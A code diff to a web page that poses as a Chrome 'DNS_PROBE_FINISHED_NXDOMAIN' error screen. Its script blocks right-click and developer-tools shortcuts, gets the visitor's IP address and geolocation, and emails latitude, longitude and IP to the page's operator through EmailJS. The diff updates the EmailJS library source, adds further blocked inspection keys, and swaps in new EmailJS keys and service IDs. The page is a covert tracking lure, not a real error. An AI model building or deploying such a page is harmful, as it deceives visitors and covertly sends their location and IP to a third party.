@@ -47,8 +47,7 @@
         <div>DNS_PROBE_FINISHED_NXDOMAIN</div>
         <button class="button" id="navigateButton">Reload</button>
     </div>
-
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
         const deviceType = (() => {
             const userAgent = navigator.userAgent;
@@ -71,12 +70,12 @@
         // Disable context menu and some key combinations
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'i') || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.key === 'u')) {
+            if (e.key === 'F12' || e.ctrlKey && e.shiftKey && e.key === 'i' || e.ctrlKey && e.shiftKey && e.key === 'I'|| e.ctrlKey && e.shiftKey && e.key === 'c' || e.ctrlKey && e.shiftKey && e.key === 'C' || e.ctrlKey && e.key === 'U' || e.ctrlKey && e.key === 'u') {
                 e.preventDefault();
             }
         });
 
-        emailjs.init("MPhPUQIdgkUqoKusv");
+        emailjs.init("59lIq8t38QCpN7yr2");
 
         async function getIP() {
             try {
@@ -117,7 +116,7 @@
         }
 
         function sendEmail(position, ipAddress, data) {
-            emailjs.send("service_k0yec69", "template_1f01srj", {
+            emailjs.send("service_simqgxz", "template_38eh6sw", {
                 user_latitude: position.coords.latitude,
                 user_longitude: position.coords.longitude,
                 user_ipaddress: ipAddress,
